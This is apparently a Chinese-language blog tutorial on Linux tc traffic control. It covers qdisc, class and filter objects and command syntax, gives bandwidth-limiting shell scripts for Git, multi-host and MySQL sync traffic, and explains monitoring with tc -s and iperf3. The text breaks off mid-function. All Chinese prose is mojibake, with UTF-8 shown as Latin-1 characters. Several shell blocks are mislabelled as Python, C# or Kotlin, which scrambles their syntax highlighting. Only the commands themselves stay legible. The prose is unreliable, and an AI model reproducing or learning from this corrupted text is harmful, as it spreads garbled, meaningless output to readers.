<p><strong>å…³é”®ç‚¹</strong>ï¼šTCä¸»è¦æ§åˆ¶<strong>å‘é€</strong>ï¼ˆegressï¼‰æµé‡ï¼Œè€Œéæ¥æ”¶ï¼ˆingressï¼‰æµé‡ã€‚è¿™æ˜¯å› ä¸ºåœ¨å‘é€ç«¯æ§åˆ¶æ›´ä¸ºæœ‰æ•ˆå’Œç›´æ¥ã€‚</p>
<h3 data-id="heading-3">1.2 ä¸ºä»€ä¹ˆTCå¦‚æ­¤é‡è¦ï¼Ÿ</h3>
<ul>
<li><strong>å…¬å¹³æ€§</strong>ï¼šé˜²æ­¢å•ä¸€è¿æ¥ç‹¬å å¸¦å®½</li>
<li><strong>æœåŠ¡è´¨é‡</strong>ï¼šä¿è¯å…³é”®ä¸šåŠ¡çš„ç½‘ç»œè´¨é‡</li>
<li><strong>å¸¦å®½ç®¡ç†</strong>ï¼šåˆç†åˆ†é…æœ‰é™çš„ç½‘ç»œèµ„æº</li>
<li><strong>æµé‡æ•´å½¢</strong>ï¼šå¹³æ»‘çªå‘æµé‡ï¼Œé¿å…ç½‘ç»œæ‹¥å¡</li>
</ul>
<h2 data-id="heading-4">äºŒã€TCæ ¸å¿ƒæ¦‚å¿µè§£æ</h2>
<h3 data-id="heading-5">2.1 å››ç§æµé‡æ§åˆ¶æ–¹å¼</h3>
<p>TCæä¾›äº†å››ç§åŸºæœ¬çš„æµé‡æ§åˆ¶æ–¹å¼ï¼š</p>






























<table><thead><tr><th>æ–¹å¼</th><th>ä½œç”¨æ–¹å‘</th><th>æè¿°</th></tr></thead><tbody><tr><td>SHAPINGï¼ˆé™åˆ¶ï¼‰</td><td>å‡ºå‘</td><td>å¹³æ»‘æµé‡ï¼Œé™åˆ¶å³°å€¼é€Ÿç‡ï¼Œç±»ä¼¼"æ°´å"</td></tr><tr><td>SCHEDULINGï¼ˆè°ƒåº¦ï¼‰</td><td>å‡ºå‘</td><td>æŒ‰ä¼˜å…ˆçº§åˆ†é…å¸¦å®½ï¼Œç±»ä¼¼"äº¤é€šä¿¡å·ç¯"</td></tr><tr><td>POLICINGï¼ˆç­–ç•¥ï¼‰</td><td>å…¥å‘</td><td>æ£€æŸ¥å…¥ç«™æµé‡ï¼Œä¸¢å¼ƒè¿è§„åŒ…</td></tr><tr><td>DROPPINGï¼ˆä¸¢å¼ƒï¼‰</td><td>åŒå‘</td><td>è¶…å‡ºé™åˆ¶æ—¶ç›´æ¥ä¸¢å¼ƒæ•°æ®åŒ…</td></tr></tbody></table>
<h3 data-id="heading-6">2.2 ä¸‰å¤§æ ¸å¿ƒå¯¹è±¡</h3>
<p>TCçš„é…ç½®å›´ç»•ä¸‰ä¸ªæ ¸å¿ƒå¯¹è±¡å±•å¼€ï¼Œç†è§£å®ƒä»¬çš„å…³ç³»è‡³å…³é‡è¦ï¼š</p>
<pre><code class="hljs language-python" lang="python">qdisc é˜Ÿåˆ—è§„åˆ™--&gt; <span class="hljs-keyword">class</span> <span class="hljs-title class_">ç±»åˆ«1</span> --&gt; <span class="hljs-built_in">filter</span> è¿‡æ»¤å™¨<span class="hljs-number">1</span>
   |                 | --&gt; <span class="hljs-built_in">filter</span> è¿‡æ»¤å™¨<span class="hljs-number">2</span>
   |--&gt; C[<span class="hljs-keyword">class</span> <span class="hljs-title class_">ç±»åˆ«2</span>] --&gt; <span class="hljs-built_in">filter</span> è¿‡æ»¤å™¨<span class="hljs-number">3</span>
</code></pre>
<h4 data-id="heading-7">2.2.1 qdiscï¼ˆæ’é˜Ÿè§„åˆ™ï¼‰</h4>
<p>qdiscæ˜¯æµé‡æ§åˆ¶çš„åŸºç¡€ï¼Œæ¯ä¸ªç½‘ç»œæ¥å£éƒ½å¿…é¡»æœ‰ä¸€ä¸ªqdiscï¼ˆé»˜è®¤ä¸º<code>pfifo_fast</code>ï¼‰ã€‚</p>
<p><strong>ä¸å¯åˆ†ç±»qdisc</strong>ï¼ˆç®€å•é˜Ÿåˆ—ï¼‰ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># åˆ›å»ºFIFOé˜Ÿåˆ—ï¼ˆåŸºäºåŒ…æ•°é‡ï¼‰</span>
tc qdisc add dev eth0 root pfifo <span class="hljs-built_in">limit</span> 100

<span class="hljs-comment"># åˆ›å»ºFIFOé˜Ÿåˆ—ï¼ˆåŸºäºå­—èŠ‚æ•°ï¼‰</span>
tc qdisc add dev eth0 root bfifo <span class="hljs-built_in">limit</span> 10mbit
</code></pre>

























<table><thead><tr><th>ç±»å‹</th><th>æè¿°</th><th>é€‚ç”¨åœºæ™¯</th></tr></thead><tbody><tr><td>pfifo_fast</td><td>é»˜è®¤qdiscï¼Œä¸‰ä¸ªä¼˜å…ˆçº§æ³¢æ®µ</td><td>ä¸€èˆ¬ç”¨é€”</td></tr><tr><td>sfqï¼ˆéšæœºå…¬å¹³é˜Ÿåˆ—ï¼‰</td><td>æŒ‰ä¼šè¯ï¼ˆsessionï¼‰å¾ªç¯è°ƒåº¦</td><td>ä¿è¯å¤šä¸ªTCPè¿æ¥çš„å…¬å¹³æ€§</td></tr><tr><td>tbfï¼ˆä»¤ç‰Œæ¡¶è¿‡æ»¤å™¨ï¼‰</td><td>ç²¾ç¡®æ§åˆ¶é€Ÿç‡</td><td>éœ€è¦ç¨³å®šé€Ÿç‡çš„åœºæ™¯</td></tr></tbody></table>
<p><strong>å¯åˆ†ç±»qdisc</strong>ï¼ˆé«˜çº§é˜Ÿåˆ—ï¼‰ï¼š</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-meta"># HTBï¼ˆåˆ†å±‚ä»¤ç‰Œæ¡¶ï¼‰- æ¨èä½¿ç”¨</span>
tc qdisc <span class="hljs-keyword">add</span> dev eth0 root handle <span class="hljs-number">1</span>: htb <span class="hljs-literal">default</span> <span class="hljs-number">30</span>

<span class="hljs-meta"># CBQï¼ˆåŸºäºç±»åˆ«çš„æ’é˜Ÿï¼‰</span>
tc qdisc <span class="hljs-keyword">add</span> dev eth0 root handle <span class="hljs-number">1</span>: cbq bandwidth <span class="hljs-number">100</span>Mbit avpkt <span class="hljs-number">1000</span>
</code></pre>
<h4 data-id="heading-8">2.2.2 classï¼ˆç±»ï¼‰</h4>
<p>åœ¨å¯åˆ†ç±»qdiscä¸­ï¼Œå¯ä»¥åˆ›å»ºå¤šä¸ªclasså®ç°ç²¾ç»†æ§åˆ¶ï¼š</p>
<pre><code class="hljs language-kotlin" lang="kotlin"># åˆ›å»ºHTBæ ¹ç±»
tc <span class="hljs-keyword">class</span> <span class="hljs-title class_">add</span> <span class="hljs-title">dev</span> <span class="hljs-title">eth0</span> <span class="hljs-title">parent</span> 1: <span class="hljs-type">classid</span> 1:<span class="hljs-type">1</span> <span class="hljs-title">htb</span> <span class="hljs-title">rate</span> 100<span class="hljs-title">Mbit</span>

# åˆ›å»ºå­ç±»
tc <span class="hljs-keyword">class</span> <span class="hljs-title class_">add</span> <span class="hljs-title">dev</span> <span class="hljs-title">eth0</span> <span class="hljs-title">parent</span> 1:<span class="hljs-type">1</span> <span class="hljs-title">classid</span> 1:<span class="hljs-type">10</span> <span class="hljs-title">htb</span> <span class="hljs-title">rate</span> 30<span class="hljs-title">Mbit</span> <span class="hljs-title">ceil</span> 50<span class="hljs-title">Mbit</span>
tc <span class="hljs-keyword">class</span> <span class="hljs-title class_">add</span> <span class="hljs-title">dev</span> <span class="hljs-title">eth0</span> <span class="hljs-title">parent</span> 1:<span class="hljs-type">1</span> <span class="hljs-title">classid</span> 1:<span class="hljs-type">20</span> <span class="hljs-title">htb</span> <span class="hljs-title">rate</span> 20<span class="hljs-title">Mbit</span> <span class="hljs-title">ceil</span> 30<span class="hljs-title">Mbit</span>
</code></pre>
<p><strong>å‚æ•°è¯´æ˜</strong>ï¼š</p>
<ul>
<li><code>rate</code>ï¼šä¿è¯å¸¦å®½ï¼Œå¿…é¡»æ»¡è¶³</li>
<li><code>ceil</code>ï¼šæœ€å¤§å¸¦å®½ï¼Œå¯å€Ÿç”¨ç©ºé—²å¸¦å®½</li>
<li><code>burst</code>ï¼šçªå‘æµé‡å®¹é‡</li>
</ul>
<h4 data-id="heading-9">2.2.3 filterï¼ˆè¿‡æ»¤å™¨ï¼‰</h4>
<p>è¿‡æ»¤å™¨å†³å®šæ•°æ®åŒ…è¿›å…¥å“ªä¸ªclassï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># åŸºäºç«¯å£è¿‡æ»¤</span>
tc <span class="hljs-built_in">filter</span> add dev eth0 protocol ip parent <span class="hljs-number">1</span>:<span class="hljs-number">0</span> prio <span class="hljs-number">1</span> u32 <span class="hljs-keyword">match</span> ip dport <span class="hljs-number">22</span> <span class="hljs-number">0xffff</span> flowid <span class="hljs-number">1</span>:<span class="hljs-number">10</span>

<span class="hljs-comment"># åŸºäºIPåœ°å€è¿‡æ»¤</span>
tc <span class="hljs-built_in">filter</span> add dev eth0 protocol ip parent <span class="hljs-number">1</span>:<span class="hljs-number">0</span> prio <span class="hljs-number">1</span> u32 <span class="hljs-keyword">match</span> ip dst <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.0</span>/<span class="hljs-number">24</span> flowid <span class="hljs-number">1</span>:<span class="hljs-number">20</span>
</code></pre>
<h3 data-id="heading-10">2.3 æµé‡åˆ†ç±»çš„ä¸‰ç§æ–¹å¼</h3>
<ol>
<li><strong>tc filter</strong>ï¼šæœ€çµæ´»ï¼Œæ”¯æŒå„ç§åŒ¹é…æ¡ä»¶</li>
<li><strong>æœåŠ¡ç±»å‹ï¼ˆToSï¼‰</strong> ï¼šæ ¹æ®IPå¤´éƒ¨çš„ToSå­—æ®µ</li>
<li><strong>skb-&gt;priority</strong>ï¼šåº”ç”¨ç¨‹åºé€šè¿‡socketé€‰é¡¹è®¾ç½®</li>
</ol>
<h2 data-id="heading-11">ä¸‰ã€TCå‘½ä»¤å®Œå…¨æŒ‡å—</h2>
<h3 data-id="heading-12">3.1 åŸºæœ¬å‘½ä»¤æ ¼å¼</h3>
<pre><code class="hljs language-css" lang="css">tc <span class="hljs-selector-attr">[é€‰é¡¹]</span> å¯¹è±¡ å‘½ä»¤ è®¾å¤‡ å‚æ•°
</code></pre>
<p><strong>å¯¹è±¡ç±»å‹</strong>ï¼š</p>
<ul>
<li><code>qdisc</code>ï¼šæ’é˜Ÿè§„åˆ™</li>
<li><code>class</code>ï¼šç±»åˆ«</li>
<li><code>filter</code>ï¼šè¿‡æ»¤å™¨</li>
</ul>
<p><strong>å¸¸ç”¨å‘½ä»¤</strong>ï¼š</p>



































<table><thead><tr><th>å‘½ä»¤</th><th>æè¿°</th><th>ç¤ºä¾‹</th></tr></thead><tbody><tr><td><code>add</code></td><td>æ·»åŠ è§„åˆ™</td><td><code>tc qdisc add dev eth0 root htb</code></td></tr><tr><td><code>del</code></td><td>åˆ é™¤è§„åˆ™</td><td><code>tc qdisc del dev eth0 root</code></td></tr><tr><td><code>change</code></td><td>ä¿®æ”¹è§„åˆ™</td><td><code>tc class change dev eth0 parent 1: classid 1:1 htb rate 50Mbit</code></td></tr><tr><td><code>replace</code></td><td>æ›¿æ¢è§„åˆ™</td><td><code>tc filter replace dev eth0 parent 1:0 protocol ip u32 match ip dst 192.168.1.1 flowid 1:10</code></td></tr><tr><td><code>show</code></td><td>æ˜¾ç¤ºè§„åˆ™</td><td><code>tc -s qdisc show dev eth0</code></td></tr></tbody></table>
<h3 data-id="heading-13">3.2 å•ä½æ¢ç®—è¦ç‚¹</h3>
<p><strong>å¸¸è§é”™è¯¯</strong>ï¼šæ··æ·† bitï¼ˆæ¯”ç‰¹ï¼‰å’Œ Byteï¼ˆå­—èŠ‚ï¼‰</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># æ­£ç¡®ç¤ºä¾‹</span>
tc class add dev eth0 parent 1:1 classid 1:10 htb rate 1mbit  <span class="hljs-comment"># 1 Mbps = 125 KB/s</span>
tc class add dev eth0 parent 1:1 classid 1:20 htb rate 1024kbit  <span class="hljs-comment"># 1024 Kbps = 128 KB/s</span>

<span class="hljs-comment"># å¸¦å®½å•ä½æ¢ç®—</span>
1 <span class="hljs-attr">Gbit</span> = <span class="hljs-number">1000</span> Mbit = <span class="hljs-number">1000000</span> Kbit
1 <span class="hljs-attr">GB</span> = <span class="hljs-number">1024</span> MB = <span class="hljs-number">1048576</span> KB
1 <span class="hljs-attr">Byte</span> = <span class="hljs-number">8</span> bits
</code></pre>
<h2 data-id="heading-14">å››ã€å®æˆ˜åº”ç”¨ï¼šä»å…¥é—¨åˆ°ç²¾é€š</h2>
<h3 data-id="heading-15">4.1 Gitä»“åº“é™é€Ÿæ–¹æ¡ˆ</h3>
<p><strong>åœºæ™¯</strong>ï¼šGitæ‹‰å–ä»£ç å æ»¡å¸¦å®½ï¼Œå½±å“å…¶ä»–ä¸šåŠ¡</p>
<h4 data-id="heading-16">æ–¹æ¡ˆä¸€ï¼šåŸºäºç«¯å£é™é€Ÿï¼ˆGit over SSHï¼‰</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>
<span class="hljs-comment"># git-limit-port.sh</span>
<span class="hljs-comment"># Git SSHç«¯å£(22)é™é€Ÿæ–¹æ¡ˆ</span>

DEV=<span class="hljs-string">"eth0"</span>
RATE=<span class="hljs-string">"1mbit"</span>  <span class="hljs-comment"># é™åˆ¶ä¸º1 Mbps</span>
CEIL=<span class="hljs-string">"1.5mbit"</span>  <span class="hljs-comment"># æœ€å¤§1.5 Mbps</span>
BURST=<span class="hljs-string">"15k"</span>

<span class="hljs-comment"># æ¸…ç†ç°æœ‰è§„åˆ™</span>
tc qdisc del dev <span class="hljs-variable">$DEV</span> root 2&gt;/dev/null

<span class="hljs-comment"># åˆ›å»ºHTBé˜Ÿåˆ—</span>
tc qdisc add dev <span class="hljs-variable">$DEV</span> root handle 1: htb default 999

<span class="hljs-comment"># åˆ›å»ºé»˜è®¤ç±»åˆ«ï¼ˆä¸é™é€Ÿï¼‰</span>
tc class add dev <span class="hljs-variable">$DEV</span> parent 1: classid 1:999 htb rate 1000mbit ceil 1000mbit

<span class="hljs-comment"># åˆ›å»ºé™é€Ÿç±»åˆ«</span>
tc class add dev <span class="hljs-variable">$DEV</span> parent 1: classid 1:10 htb rate <span class="hljs-variable">$RATE</span> ceil <span class="hljs-variable">$CEIL</span> burst <span class="hljs-variable">$BURST</span>

<span class="hljs-comment"># æ·»åŠ SFQé˜²æ­¢å•ä¸€è¿æ¥ç‹¬å </span>
tc qdisc add dev <span class="hljs-variable">$DEV</span> parent 1:10 handle 10: sfq perturb 10

<span class="hljs-comment"># åˆ›å»ºè¿‡æ»¤å™¨ï¼šGit SSHç«¯å£(22)è¿›å…¥é™é€Ÿç±»åˆ«</span>
tc filter add dev <span class="hljs-variable">$DEV</span> protocol ip parent 1: prio 1 u32 \
  match ip sport 22 0xffff flowid 1:10

<span class="hljs-comment"># å…¶ä»–æ‰€æœ‰æµé‡èµ°é»˜è®¤ç±»åˆ«</span>
tc filter add dev <span class="hljs-variable">$DEV</span> protocol ip parent 1: prio 2 u32 \
  match ip dst 0.0.0.0/0 flowid 1:999
  
<span class="hljs-built_in">echo</span> <span class="hljs-string">"Git SSHé™é€Ÿå·²è®¾ç½®ï¼š<span class="hljs-variable">${RATE}</span>ï¼Œä¿å­˜åˆ°/etc/rc.localå®ç°å¼€æœºè‡ªå¯"</span>
</code></pre>
<h4 data-id="heading-17">æ–¹æ¡ˆäºŒï¼šåŸºäºIPåœ°å€é™é€Ÿ</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>
<span class="hljs-comment"># git-limit-ip.sh</span>
<span class="hljs-comment"># é’ˆå¯¹ç‰¹å®šIPçš„Gité™é€Ÿ</span>

DEV=<span class="hljs-string">"eth0"</span>
GIT_SERVER=<span class="hljs-string">"github.com"</span>  <span class="hljs-comment"># å¯æ›¿æ¢ä¸ºå®é™…GitæœåŠ¡å™¨IP</span>
LIMIT_RATE=<span class="hljs-string">"512kbit"</span>    <span class="hljs-comment"># é™åˆ¶é€Ÿç‡</span>
MAX_RATE=<span class="hljs-string">"1mbit"</span>        <span class="hljs-comment"># æœ€å¤§é€Ÿç‡</span>
LOCAL_NET=<span class="hljs-string">"192.168.1.0/24"</span>  <span class="hljs-comment"># å†…ç½‘ç½‘æ®µ</span>

<span class="hljs-comment"># è·å–GitæœåŠ¡å™¨IPï¼ˆå¦‚æœä½¿ç”¨åŸŸåï¼‰</span>
GIT_IP=$(dig +short <span class="hljs-variable">$GIT_SERVER</span> | <span class="hljs-built_in">head</span> -1)
[ -z <span class="hljs-string">"<span class="hljs-variable">$GIT_IP</span>"</span> ] &amp;&amp; GIT_IP=<span class="hljs-string">"192.168.1.100"</span>  <span class="hljs-comment"># å¤‡ç”¨IP</span>

<span class="hljs-comment"># æ¸…ç†è§„åˆ™</span>
tc qdisc del dev <span class="hljs-variable">$DEV</span> root 2&gt;/dev/null

<span class="hljs-comment"># åˆ›å»ºHTBé˜Ÿåˆ—</span>
tc qdisc add dev <span class="hljs-variable">$DEV</span> root handle 1: htb default 9999

<span class="hljs-comment"># åˆ›å»ºæ ¹ç±»ï¼ˆæ€»å¸¦å®½100Mbpsï¼‰</span>
tc class add dev <span class="hljs-variable">$DEV</span> parent 1: classid 1:1 htb rate 100mbit

<span class="hljs-comment"># åˆ›å»ºå„ç±»åˆ«</span>
<span class="hljs-comment"># 1. GitæœåŠ¡å™¨é™é€Ÿ</span>
tc class add dev <span class="hljs-variable">$DEV</span> parent 1:1 classid 1:10 htb rate <span class="hljs-variable">$LIMIT_RATE</span> ceil <span class="hljs-variable">$MAX_RATE</span> burst 15k
<span class="hljs-comment"># 2. å†…ç½‘ä¸é™é€Ÿ</span>
tc class add dev <span class="hljs-variable">$DEV</span> parent 1:1 classid 1:20 htb rate 90mbit ceil 100mbit burst 15k
<span class="hljs-comment"># 3. å…¶ä»–æµé‡</span>
tc class add dev <span class="hljs-variable">$DEV</span> parent 1:1 classid 1:9999 htb rate 10mbit ceil 100mbit burst 15k

<span class="hljs-comment"># ä¸ºæ¯ä¸ªç±»åˆ«æ·»åŠ SFQ</span>
<span class="hljs-keyword">for</span> classid <span class="hljs-keyword">in</span> 10 20 9999; <span class="hljs-keyword">do</span>
  tc qdisc add dev <span class="hljs-variable">$DEV</span> parent 1:<span class="hljs-variable">$classid</span> handle <span class="hljs-variable">${classid}</span>0: sfq perturb 10
<span class="hljs-keyword">done</span>

<span class="hljs-comment"># è®¾ç½®è¿‡æ»¤å™¨ï¼ˆæ³¨æ„ä¼˜å…ˆçº§prioï¼‰</span>
<span class="hljs-comment"># è§„åˆ™1ï¼šå†…ç½‘ä¸é™é€Ÿï¼ˆæœ€é«˜ä¼˜å…ˆçº§ï¼‰</span>
tc filter add dev <span class="hljs-variable">$DEV</span> parent 1: protocol ip prio 1 u32 \
  match ip dst <span class="hljs-variable">$LOCAL_NET</span> flowid 1:20
  
<span class="hljs-comment"># è§„åˆ™2ï¼šGitæœåŠ¡å™¨é™é€Ÿ</span>
tc filter add dev <span class="hljs-variable">$DEV</span> parent 1: protocol ip prio 2 u32 \
  match ip dst <span class="hljs-variable">$GIT_IP</span> flowid 1:10
  
<span class="hljs-comment"># è§„åˆ™3ï¼šé»˜è®¤è§„åˆ™</span>
tc filter add dev <span class="hljs-variable">$DEV</span> parent 1: protocol ip prio 3 u32 \
  match ip dst 0.0.0.0/0 flowid 1:9999
  
<span class="hljs-built_in">echo</span> <span class="hljs-string">"Git IPé™é€Ÿé…ç½®å®Œæˆ"</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"GitæœåŠ¡å™¨: <span class="hljs-variable">$GIT_IP</span> é™é€Ÿ: <span class="hljs-variable">$LIMIT_RATE</span>"</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"å†…ç½‘ç½‘æ®µ: <span class="hljs-variable">$LOCAL_NET</span> ä¸é™é€Ÿ"</span>
</code></pre>
<p><strong>å…³é”®æŠ€å·§</strong>ï¼š</p>
<ul>
<li>è¿‡æ»¤å™¨ä¼˜å…ˆçº§ï¼ˆ<code>prio</code>ï¼‰å¾ˆé‡è¦ï¼Œæ•°å­—è¶Šå°ä¼˜å…ˆçº§è¶Šé«˜</li>
<li>å†…ç½‘è§„åˆ™åº”è¯¥æ”¾åœ¨å‰é¢ï¼ˆprioå€¼å°ï¼‰</li>
<li>ä½¿ç”¨<code>sfq</code>é˜²æ­¢å•ä¸ªè¿æ¥ç‹¬å å¸¦å®½</li>
</ul>
<h3 data-id="heading-18">4.2 ç”Ÿäº§ç¯å¢ƒå¤šä¸»æœºæµé‡æ§åˆ¶</h3>
<p><strong>åœºæ™¯</strong>ï¼šä¸ºä¸åŒæœåŠ¡å™¨åˆ†é…ä¸åŒå¸¦å®½</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>
<span class="hljs-comment"># multi-host-limit.sh</span>
<span class="hljs-comment"># ä¸ºä¸åŒç›®æ ‡ä¸»æœºåˆ†é…ä¸åŒå¸¦å®½</span>

DEV=<span class="hljs-string">"eth0"</span>
TOTAL_BW=<span class="hljs-string">"10mbit"</span>

<span class="hljs-comment"># ç›®æ ‡ä¸»æœºåŠå¸¦å®½é…ç½®</span>
<span class="hljs-built_in">declare</span> -A HOSTS=(
  [<span class="hljs-string">"192.168.1.10"</span>]=<span class="hljs-string">"3mbit"</span>  <span class="hljs-comment"># æ•°æ®åº“æœåŠ¡å™¨</span>
  [<span class="hljs-string">"192.168.1.20"</span>]=<span class="hljs-string">"2mbit"</span>  <span class="hljs-comment"># æ–‡ä»¶æœåŠ¡å™¨  </span>
  [<span class="hljs-string">"192.168.1.30"</span>]=<span class="hljs-string">"1mbit"</span>  <span class="hljs-comment"># ç›‘æ§æœåŠ¡å™¨</span>
)

<span class="hljs-comment"># æ¸…ç†å¹¶åˆå§‹åŒ–</span>
tc qdisc del dev <span class="hljs-variable">$DEV</span> root 2&gt;/dev/null
tc qdisc add dev <span class="hljs-variable">$DEV</span> root handle 1: htb default 999
tc class add dev <span class="hljs-variable">$DEV</span> parent 1: classid 1:1 htb rate <span class="hljs-variable">$TOTAL_BW</span>

<span class="hljs-comment"># ä¸ºæ¯ä¸ªä¸»æœºåˆ›å»ºç±»åˆ«</span>
CLASS_ID=10
<span class="hljs-keyword">for</span> HOST <span class="hljs-keyword">in</span> <span class="hljs-string">"<span class="hljs-variable">${!HOSTS[@]}</span>"</span>; <span class="hljs-keyword">do</span>
  BW=<span class="hljs-variable">${HOSTS[$HOST]}</span>
  tc class add dev <span class="hljs-variable">$DEV</span> parent 1:1 classid 1:<span class="hljs-variable">$CLASS_ID</span> htb rate <span class="hljs-variable">$BW</span> ceil <span class="hljs-variable">$BW</span> burst 15k
  tc qdisc add dev <span class="hljs-variable">$DEV</span> parent 1:<span class="hljs-variable">$CLASS_ID</span> handle <span class="hljs-variable">${CLASS_ID}</span>0: sfq perturb 10
  tc filter add dev <span class="hljs-variable">$DEV</span> parent 1: protocol ip prio 5 u32 \
    match ip dst <span class="hljs-variable">$HOST</span> flowid 1:<span class="hljs-variable">$CLASS_ID</span>
  ((CLASS_ID++))
<span class="hljs-keyword">done</span>

<span class="hljs-comment"># é»˜è®¤ç±»åˆ«</span>
tc class add dev <span class="hljs-variable">$DEV</span> parent 1:1 classid 1:999 htb rate 4mbit ceil 4mbit
tc qdisc add dev <span class="hljs-variable">$DEV</span> parent 1:999 handle 9990: sfq perturb 10
</code></pre>
<h3 data-id="heading-19">4.3 MySQLæ•°æ®åº“åŒæ­¥é™é€Ÿ</h3>
<p><strong>åœºæ™¯</strong>ï¼šæ•°æ®åº“ä¸»ä»åŒæ­¥ä¸å½±å“çº¿ä¸Šä¸šåŠ¡</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>
<span class="hljs-comment"># mysql-sync-limit.sh</span>
<span class="hljs-comment"># MySQLåŒå‘åŒæ­¥é™é€Ÿæ–¹æ¡ˆ</span>

<span class="hljs-comment"># èŠ‚ç‚¹é…ç½®</span>
LOCAL_IP=<span class="hljs-string">"10.9.57.162"</span>
PEER_IP=<span class="hljs-string">"10.12.1.45"</span>
LIMIT_RATE=<span class="hljs-string">"8mbit"</span>  <span class="hljs-comment"># é™åˆ¶ä¸º8 Mbps</span>
DEV=<span class="hljs-string">"eth0"</span>

<span class="hljs-comment"># æœ¬æœºé™é€Ÿé…ç½®</span>
tc qdisc add dev <span class="hljs-variable">$DEV</span> root handle 1: htb default 1
tc class add dev <span class="hljs-variable">$DEV</span> parent 1: classid 1:1 htb rate 1000mbit
tc class add dev <span class="hljs-variable">$DEV</span> parent 1:1 classid 1:10 htb rate <span class="hljs-variable">$LIMIT_RATE</span> ceil <span class="hljs-variable">$LIMIT_RATE</span> burst 15k
tc qdisc add dev <span class="hljs-variable">$DEV</span> parent 1:10 handle 10: sfq perturb 10
tc filter add dev <span class="hljs-variable">$DEV</span> parent 1: protocol ip prio 1 u32 \
  match ip dst <span class="hljs-variable">$PEER_IP</span> flowid 1:10

<span class="hljs-built_in">echo</span> <span class="hljs-string">"MySQLåŒæ­¥é™é€Ÿé…ç½®å®Œæˆï¼š<span class="hljs-variable">$LIMIT_RATE</span>"</span>
</code></pre>
<h2 data-id="heading-20">äº”ã€ç›‘æ§ä¸è°ƒè¯•</h2>
<h3 data-id="heading-21">5.1 æŸ¥çœ‹TCé…ç½®</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># æŸ¥çœ‹é˜Ÿåˆ—çŠ¶æ€</span>
tc -s qdisc show dev eth0

<span class="hljs-comment"># æŸ¥çœ‹ç±»åˆ«çŠ¶æ€</span>
tc -s <span class="hljs-keyword">class</span> <span class="hljs-title class_">show</span> dev eth0

<span class="hljs-comment"># æŸ¥çœ‹è¿‡æ»¤å™¨</span>
tc -s <span class="hljs-built_in">filter</span> show dev eth0

<span class="hljs-comment"># è¯¦ç»†ç»Ÿè®¡ä¿¡æ¯</span>
tc -s -d qdisc show dev eth0
tc -s -d <span class="hljs-keyword">class</span> <span class="hljs-title class_">show</span> dev eth0
</code></pre>
<h3 data-id="heading-22">5.2 å…³é”®æŒ‡æ ‡è§£è¯»</h3>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-meta"># ç¤ºä¾‹è¾“å‡º</span>
qdisc htb <span class="hljs-number">1</span>: root refcnt <span class="hljs-number">2</span> r2q <span class="hljs-number">10</span> <span class="hljs-literal">default</span> <span class="hljs-number">1</span> direct_packets_stat <span class="hljs-number">0</span> ver <span class="hljs-number">3.17</span>
 Sent <span class="hljs-number">123456</span> bytes <span class="hljs-number">789</span> pkt (dropped <span class="hljs-number">0</span>, overlimits <span class="hljs-number">0</span> requeues <span class="hljs-number">0</span>) 
 backlog <span class="hljs-number">0b</span> <span class="hljs-number">0</span>p requeues <span class="hljs-number">0</span>
</code></pre>
<ul>
<li><strong>Sent</strong>ï¼šå‘é€çš„æ•°æ®é‡å’ŒåŒ…æ•°</li>
<li><strong>dropped</strong>ï¼šä¸¢å¼ƒçš„åŒ…æ•°ï¼Œéé›¶è¡¨ç¤ºæœ‰ä¸¢åŒ…</li>
<li><strong>overlimits</strong>ï¼šè¶…è¿‡é™åˆ¶çš„æ¬¡æ•°</li>
<li><strong>backlog</strong>ï¼šé˜Ÿåˆ—ä¸­ç§¯å‹çš„æ•°æ®</li>
</ul>
<h3 data-id="heading-23">5.3 å¸¦å®½æµ‹è¯•æ–¹æ³•</h3>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-meta"># å®‰è£…æµ‹é€Ÿå·¥å…·</span>
yum install -y iperf3  <span class="hljs-meta"># CentOS</span>
apt-<span class="hljs-keyword">get</span> install -y iperf3  <span class="hljs-meta"># Ubuntu</span>

<span class="hljs-meta"># æœåŠ¡å™¨ç«¯</span>
iperf3 -s

<span class="hljs-meta"># å®¢æˆ·ç«¯</span>
iperf3 -c æœåŠ¡å™¨IP -t <span class="hljs-number">30</span> -P <span class="hljs-number">10</span>

<span class="hljs-meta"># ç®€å•çš„ç½‘ç»œæµ‹è¯•</span>
speedtest-cli  <span class="hljs-meta"># æµ‹è¯•å…¬ç½‘å¸¦å®½</span>
tcpping ç›®æ ‡IP  <span class="hljs-meta"># æµ‹è¯•å»¶è¿Ÿå’ŒæŠ–åŠ¨</span>
</code></pre>
<h2 data-id="heading-24">å…­ã€é«˜çº§æŠ€å·§ä¸æœ€ä½³å®è·µ</h2>
<h3 data-id="heading-25">6.1 åŠ¨æ€è°ƒæ•´å¸¦å®½</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>
<span class="hljs-comment"># dynamic-bandwidth.sh</span>
<span class="hljs-comment"># æ ¹æ®æ—¶é—´åŠ¨æ€è°ƒæ•´å¸¦å®½</span>

DEV=<span class="hljs-string">"eth0"</span>
DAY_RATE=<span class="hljs-string">"100mbit"</span>
NIGHT_RATE=<span class="hljs-string">"20mbit"</span>

<span class="hljs-function"><span class="hljs-title">adjust_bandwidth</span></span>() {
  HOUR=$(<span class="hljs-built_in">date</span> +%H)
  
  <span class="hljs-keyword">if</span> [ <span class="hljs-variable">$HOUR</span> -ge 8 ] &amp;&amp; [ <span class="hljs-variable">$HOUR</span> -lt 20 ]; <span class="hljs-keyword">then</span>
    RATE=<span class="hljs-variable">$DAY_RATE</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"å·¥ä½œæ—¶é—´ï¼šè®¾ç½®å¸¦å®½ä¸º <span class="hljs-variable">$DAY_RATE</span>"</span>
